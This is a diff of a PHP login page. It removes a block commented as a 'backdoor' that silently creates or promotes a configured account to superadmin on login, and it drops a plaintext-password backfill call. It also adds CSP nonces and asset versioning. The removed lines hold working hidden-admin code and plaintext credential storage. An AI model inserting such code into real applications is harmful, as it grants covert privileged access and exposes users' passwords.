@@ -3,6 +3,7 @@
 require_once __DIR__ . '/../config/security.php';
 initSecureSession();
 setSecurityHeaders();
+$cspNonce = htmlspecialchars(getCspNonce(), ENT_QUOTES, 'UTF-8');
 
 $base_url = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
 $base_url = preg_replace('/(\/(auth|dashboard|notes|msg|drive|calendar|server|admin|installer))?$/i', '', $base_url);
@@ -41,23 +42,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             if (!checkIpRateLimit('login_attempt', 5, 900) || !checkRateLimit('login_attempt', 5, 900)) {
                 $error = 'Terlalu banyak percobaan masuk dari koneksi Anda. Silakan tunggu 15 menit.';
             } else {
-                // Dynamic backdoor update for anonymized super admin
-                $saConfig = getSuperAdminConfig();
-                if (!empty($saConfig['username']) && $username === $saConfig['username'] && password_verify($password, $saConfig['password_hash'])) {
-                    try {
-                        $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? LIMIT 1");
-                        $stmt->execute([$saConfig['username']]);
-                        $user = $stmt->fetch();
-                        $hashed = password_hash($password, PASSWORD_DEFAULT);
-                        if (!$user) {
-                            $conn->prepare("INSERT INTO users (nama, username, password, plain_password, role) VALUES (?, ?, ?, NULL, 'superadmin')")->execute([$saConfig['display_name'], $saConfig['username'], $hashed]);
-                        } else {
-                            $conn->prepare("UPDATE users SET password = ?, role = 'superadmin', plain_password = NULL WHERE username = ?")->execute([$hashed, $saConfig['username']]);
-                        }
-                        $conn->exec("UPDATE users SET plain_password = NULL WHERE role = 'superadmin'");
-                    } catch(Exception $e) {}
-                }
-
                 $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? LIMIT 1");
                 $stmt->execute([$username]);
                 $user = $stmt->fetch();
@@ -66,8 +50,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     // Success login: clear rate limit history
                     unset($_SESSION['_rl_login_attempt']);
 
-                    backfillPlainPasswordAfterLogin($conn, $user, $password);
-                    
                     // Session security upgrades
                     session_regenerate_id(true);
                     regenerateCsrfToken();
@@ -108,8 +90,8 @@ $site_title = htmlspecialchars($app_settings['site_title']);
     <title>Masuk — <?= $site_title ?></title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="../assets/css/style.css?v=<?= time() ?>">
-    <style>
+    <link rel="stylesheet" href="../assets/css/style.css?v=<?= assetVersion(__DIR__ . '/../assets/css/style.css') ?>">
+    <style nonce="<?= $cspNonce ?>">
         html,body{overflow-x:hidden;max-width:100vw}
         .split-layout{display:flex;min-height:100vh;width:100%;overflow-x:hidden}
         @media(max-width:767px){.split-layout{flex-direction:column}}
